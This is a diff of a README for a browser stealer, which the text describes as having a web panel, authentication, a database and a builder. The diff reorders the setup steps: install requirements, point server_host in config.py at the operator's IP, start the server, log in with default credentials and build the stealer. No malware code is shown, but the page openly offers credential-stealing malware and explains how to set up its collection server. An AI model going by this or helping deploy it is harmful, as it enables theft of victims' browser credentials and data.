@@ -5,11 +5,19 @@ This is a browser stealer with web gui panel, authentication, database and build
 ![image](https://user-images.githubusercontent.com/101527966/174895329-12b45188-9931-44ce-b142-1d692636ba50.png)
 
 # How to setup:
-pip install -r requirements.txt
 
-cd server
+$ pip install -r requirements.txt
 
-python start.ru
+open the config.py
+
+change the server_host on your ip
+
+![image](https://user-images.githubusercontent.com/101527966/174895939-564db7cc-cb90-436c-a8ca-5df0c8e7b005.png)
+
+$ cd server
+
+$ python start.ru
+
 
 # Login
 by default >
@@ -20,8 +28,8 @@ by default >
   
 ![image](https://user-images.githubusercontent.com/101527966/174895245-7c18731c-b10d-4340-bda0-390bbf4baeb0.png)
 
-# Config
-![image](https://user-images.githubusercontent.com/101527966/174895939-564db7cc-cb90-436c-a8ca-5df0c8e7b005.png)
+
+
 
 # Build stealer
 ![image](https://user-images.githubusercontent.com/101527966/174895155-0c0b570e-a655-4492-8811-04b87e5730b4.png)
